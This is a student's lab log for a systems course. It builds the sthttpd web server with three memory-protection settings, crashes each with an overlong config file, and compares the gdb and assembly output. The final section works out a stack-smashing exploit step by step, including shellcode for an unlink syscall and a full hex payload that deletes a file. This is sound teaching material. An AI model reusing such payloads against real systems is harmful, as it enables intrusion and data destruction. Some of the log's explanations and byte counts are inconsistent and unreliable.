@@ -1,0 +1,397 @@
+I edited
+Luke Jung
+904-982-644
+CS 33
+Eggert Fall 2018
+
+Smashing Lab Log
+
+** FOR TURNIN **
+I modified the .s files so that the usage line wouldn't go past 200 columns.
+
+1. Check if gcc is right
+which gcc 
+/usr/local/cs/bin/gcc
+
+2. Grab tar file and patch
+wget http://web.cs.ucla.edu/classes/fall18/cs33/lab/sthttpd-2.27.0.tar.gz
+
+emacs patch.diff
+copy paste the patch file from online and save it to the 
+sthttpd file.
+Change the paths inside to point to the right relative location
+
+patch -p0 <patch.diff
+
+--Configure and make each different option
+
+./configure LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd src/thttpd-as
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+3/4. First, needed to calculate each number from my student ID, 
+I used google to quickly calculate the numbers
+
+SP = 13180
+AS = 13181
+NO = 13182
+
+I also had to create the foo.txt file in the src directory,
+adding random phrases to check to see if it worked.
+Then, I used two terminals, one to open the server and the other
+to test with curl to see if it worked.
+
+Terminal 1 
+./thttpd-sp -p 13180 -D
+Terminal 2
+curl http://localhost:13180/foo.txt
+hi
+my name is luke
+please work
+
+Terminal 1 
+./thttpd-sp -p 13181 -D
+Terminal 2
+curl http://localhost:13181/foo.txt
+hi
+my name is luke
+please work
+
+Terminal 1 
+./thttpd-sp -p 13182 -D
+Terminal 2
+curl http://localhost:13182/foo.txt
+hi
+my name is luke
+please work
+
+So since all 3 of them worked, I created a new file
+that had more than 100 chars called big.txt and filled
+it first with dir= and a bunch of other characters.
+To check how many characters, I ran
+wc big.txt 
+1   1 275 big.txt
+
+Now I tested the commands with the new text file.
+
+5. thttpd-sp
+Run program in gdb
+gdb thttpd-sp
+(gdb) Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
+
+Seeing how the program crashed, we need to backtrace to see 
+where it crashed 
+
+#0  0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6da5fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e3ba6 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7647ce4 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e7677 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e7632 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000404165 in read_config (filename=<optimized out>) at thttpd.c:1129
+#7  0x6968696968696869 in ?? ()
+#8  0x6869696869686968 in ?? ()
+#9  0x6969686968696869 in ?? ()
+#10 0x6968696869686968 in ?? ()
+
+Seeing that we crash at #6, we should disassemble the instruction to see
+the assembly code and to see what happened.
+
+disassem 0x404150, 0x40416f
+Dump of assembler code from 0x404150 to 0x40416f:
+   0x0000000000404150 <read_config+1408>:       sub    $0xfa,%al
+   0x0000000000404152 <read_config+1410>:       (bad)
+   0x0000000000404153 <read_config+1411>:       decl   -0x77(%rax)
+   0x0000000000404156 <read_config+1414>:       add    $0x212e2d,%eax
+   0x000000000040415b <read_config+1419>:       jmpq   0x403f35 <read_config+869>
+   0x0000000000404160 <read_config+1424>:       callq  0x4023f0 <__stack_chk_fail@plt>
+   0x0000000000404165 <read_config+1429>:       nopl   (%rax)
+   0x0000000000404168 <read_config+1432>:       mov    %r13,%rsi
+   0x000000000040416b <read_config+1435>:       mov    %r12,%rdi
+   0x000000000040416e <read_config+1438>:       callq  0x4038c0 <no_value_required>
+End of assembler dump.
+
+Looking at the assembly code, we see that it calls the stack fail pointer
+with a conditional call.  
+
+This crashed because there was most likely a conditional jump that went to this
+call to crash the program.  My assumption is that it probably checked the register
+before and after the overflow occured and realized that the function was changed, meaning
+it called the crash.
+
+6. thttpd-as
+gdb thttpd-as
+(gdb) r -p 13181 -D -C big.txt
+==13206==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcdf4 at pc 
+0x00000048a72c bp 0x7fffffffcd50 sp 0x7fffffffc500
+READ of size 276 at 0x7fffffffcdf4 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff70730b8 in ?? () from /lib64/libgcc_s.so.1
+
+Seeing we get another crash, we backtrace to see where we went wrong
+
+bt
+#0  0x00007ffff70730b8 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7073fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004de8d3 in __sanitizer::BufferedStackTrace::SlowUnwindStack 
+(this=0x7fffffffaff0, pc=4761388, max_depth=<optimized out>)
+    at ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:124
+#3  0x0000000000416ba7 in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, 
+bp=140737488342352, pc=4761388, max_depth=256,
+    stack=0x7fffffffaff0) at ../../../../gcc-8.2.0/libsanitizer/asan/asan_stack.h:46
+#4  __asan::ErrorGeneric::Print (this=this@entry=0x991748 <__asan::ScopedInErrorReport::current_error_+8>)
+    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_errors.cc:446
+#5  0x00000000004d95e4 in __asan::ErrorDescription::Print (this=0x991740 
+<__asan::ScopedInErrorReport::current_error_>)
+    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_errors.h:338
+#6  __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffffb876, __in_chrg=<optimized out>)
+    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_report.cc:136
+#7  __asan::ReportGenericError (pc=4761388, bp=bp@entry=140737488342352, 
+sp=sp@entry=140737488340224, addr=addr@entry=140737488342516,
+    is_write=is_write@entry=false, access_size=access_size@entry=276, exp=0, fatal=false) at 
+    ../../../../gcc-8.2.0/libsanitizer/asan/asan_report.cc:397
+#8  0x000000000048a74b in __interceptor_strchr (s=<optimized out>, c=<optimized out>)
+    at ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:618
+#9  0x000000000050b6de in read_config (filename=<optimized out>) at thttpd.c:1018
+#10 0x6869686969686968 in ?? ()
+
+Since it crashes at #9, we'll go through the assembly code again to find out how it
+catches the error
+
+disassem 0x48a740, 0x48a74f
+0x000000000048a740 <__interceptor_strchr(char const*, int)+528>:     mov    %rbp,%rsi
+0x000000000048a743 <__interceptor_strchr(char const*, int)+531>:     mov    %rax,%rdi
+0x000000000048a746 <__interceptor_strchr(char const*, int)+534>:     callq  0x4d9280 
+<__asan::ReportGenericError(unsigned long, unsigned long, unsigned long, unsigned long, 
+bool, unsigned long, unsigned int, bool)>
+0x000000000048a74b <__interceptor_strchr(char const*, int)+539>:     pop    %r8
+0x000000000048a74d <__interceptor_strchr(char const*, int)+541>:     pop    %r9
+
+Like in the "as" example, the version checks for the crash using a error detection function.
+Therefore it crashes because of a bufferoverflow error like the previous version.
+
+7. thttpd-no
+gdb thttpd-no
+(gdb) r -p 13182 -D -C big.txt
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
+1189        (void) fclose( fp );
+
+(gdb) bt
+
+#0  0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
+#1  0x6968696968696869 in ?? ()
+#2  0x6869696869686968 in ?? ()
+#3  0x6969686968696869 in ?? ()
+
+(gdb) disassem 0x403f70, 0x403f7f
+=> 0x0000000000403f79 <read_config+1145>:       retq
+
+This assembly instruction shows that it automatically returns at the instruction given.
+
+I'm assuming this happens because the SIGSEGV error occurs when there's an invalid
+reference of memory.  Using a -zexecstack flag, we can run any proram on the stack.
+The reason it crashed is because our char string wrote into the next part of the stack
+and ended up as a return statement
+
+8. Comparing Assembly Code
+So I had to compile each c file into an assembly file with the following commands
+
+./configure \
+LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+make clean
+gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s
+
+make clean
+gcc -S -O2 -fno-inline -static-libasan -fsanitize=address -I .. -I . thttpd.c -o thttpd-as.s
+
+make clean
+gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s
+
+Then, I went through each assembly file and went to the handle_read function and checked
+through function to see the differences.
+
+For SP and NO, there's not difference at all (other than different addresses for jumps),
+meaning that both files don't check and call difference functions to say that there is
+buffer overflow.  This occurs because SP only protects character arrays, local variable 
+addresses, and local register variables, which doesn't happen in handle_read.
+
+However for "SP and AS" and "AS and SP", there are  differences, mostly that exist where
+in the -sp flag, it uses a canry value that is pushed onto the stack after a function is
+returned, and checks that value to ensure the stack hasn't been changed.  However, for the
+-as flag, the assembly code uses something like a shadow byte, for example,
+
+cmpb	$0, 2147450880(%rax)
+jne	.L1215
+...
+.L1215:
+	call	__asan_report_load8
+This compare will jump to a function called __asan_report_load8 which I'm assuming throws
+an error and aborts the program. 
+
+9. Exploit
+To find an exploit, we first need to find the difference in memory between the return
+address and the start of the array.  We can do this by going through GDB to find the 
+address of the line variable and the value of memory where it returns.
+
+emacs exploit.txt
+put in victim.txt value to test
+
+gdb thttp-no
+break read_config
+(gdb) r -p 13182 -D -C exploit.txt
+(gdb) print &line
+$1 = (char (*)[100]) 0x7fffffffce00
+(gdb) info reg rsp
+rsp            0x7fffffffce98      0x7fffffffce98
+
+Difference is
+0x7fffffffce98 - 0x7fffffffce00 = 0x98 = 152
+
+So there's 152 characters until the return address
+
+Now we need to find the hex value of "victim.txt"
+
+echo -n "victim.txt" >> exploit.txt
+xxd exploit.txt
+0000000: 7669 6374 696d 2e74 7874                 victim.txt
+
+So our value for victim.txt is 0x76 69 63 74 69 6d 2e 74 78 74
+which is 10 bytes
+
+Since it is 10 bytes away, we want to place it 16 bytes away
+due to alignment or 0x10 away.
+
+0x7fffffffce98 - 0x10 = 0x7fffffffce88
+
+We also need to figure out how to call the unlink function because
+this is the function which handles deleting names.
+We can check this function in gdb
+
+(gdb) disas /r unlink
+Dump of assembler code for function unlink:
+   0x00007ffff76c03a0 <+0>:     b8 57 00 00 00  mov    $0x57,%eax
+   0x00007ffff76c03a5 <+5>:     0f 05   syscall
+   0x00007ffff76c03a7 <+7>:     48 3d 01 f0 ff ff       cmp 
+      											$0xfffffffffffff001,%rax
+   0x00007ffff76c03ad <+13>:    73 01   jae    0x7ffff76c03b0 <unlink+16>
+   0x00007ffff76c03af <+15>:    c3      retq
+   0x00007ffff76c03b0 <+16>:    48 8b 0d b9 4a 2d 00    mov    0x2d4ab9(%rip),%rcx        
+   # 0x7ffff7994e70
+   0x00007ffff76c03b7 <+23>:    f7 d8   neg    %eax
+   0x00007ffff76c03b9 <+25>:    64 89 01        mov    %eax,%fs:(%rcx)
+   0x00007ffff76c03bc <+28>:    48 83 c8 ff     or     $0xffffffffffffffff,%rax
+   0x00007ffff76c03c0 <+32>:    c3      retq
+End of assembler dump.
+
+We see that to call unlink function it's putting the value 0x57 into
+%eax, which we want to do as well in our assembly code.
+
+Now we need to get the assembly code for the exploit.
+So I created an assembly file that would move the address
+of the pointer where I would want to put the string in and
+and created an object dump file for it. 
+
+emacs dump.s
+	movq   $0x7fffffffce88, %rdi //moves return address-0x10
+	movq   $0x57, %rax			 //calls the unlink function
+	syscall
+gcc -c dump.s
+objdump -d dump.o
+   0:	48 bf 88 ce ff ff ff 	movabs $0x7fffffffce88,%rdi
+   7:	7f 00 00 
+   a:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax
+  11:	0f 05                	syscall 
+
+
+Using this we can create an exploit string
+
+48 bf 88 ce ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05
+
+and is 19 bytes.
+
+Also we want to put the "port=" part in the front so we 
+convert "port=" the same way we converted victim.txt above
+and get the result
+
+"port="
+0x70 6f 72 74 3d 00
+
+Now putting it all together, we do the following
+
+
+70 6f 72 74 3d 00 00 00 48 bf 
+88 ce ff ff ff 7f 00 00 48 c7
+c0 57 00 00 00 0f 05 00 00 00
+-------00000 (51 00's)-------
+76 69 63 74 69 6d 2e 74 78 74
+00 00 00 00 00 00 08 ce ff ff 
+ff 7f 00 00
+
+First, we have a buffer of 152 + 8 for writing the return address
+at the end, so 160 size.
+
+The top part includes writing out port= filled with '00' bytes
+to 8 to fulfill alignemnt.
+Then the 0x48bf... is our exploit code we made above (19 bytes)
+
+The middle part is full of '00' bytes, just to fill string to 160 bytes
+
+Bottom contains the name of the file "victim.txt" or 0x76...
+and the 0x08cd... part is the address of the char array shifted over 8
+because of the "port=" in the beginning.
+
+So adding the bytes together to find the number of '00' bytes we need is
+160 - (19+16+8+8) = 109 '00' bytes
+
+So final result is
+
+70 6f 72 74 3d 00 00 00 48 bf
+88 ce ff ff ff 7f 00 00 48 c7
+c0 57 00 00 00 0f 05 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 76 69 63 74
+69 6d 2e 74 78 74 00 00 00 00
+00 00 08 ce ff ff ff 7f 00 00
+
+Using this code, we run it through a script that uses the xxd function
+from before and loops through each character and adds it to a bigger
+string.  We can label this file bad.txt and should use a loop with
+the code 
+
+for loop
+	echo "0x$c" | xxd -r >> bad.txt
+
+Once I made my bad.txt file, I ran through gdb with the exploit code
+
+touch victim.txt (to create the file to delete)
+gdb thttpd-no
+(gdb) r -p 13182 -D -C bad.txt
+
+And after quitting, the victim.txt was deleted!  
+
+However, this exploit program will only work when the $rsp pointer is
+at 0x7fffffffce98.  Therefore, since the stack is randomized usually,
+you'd have to change the value and redo most of the string values.
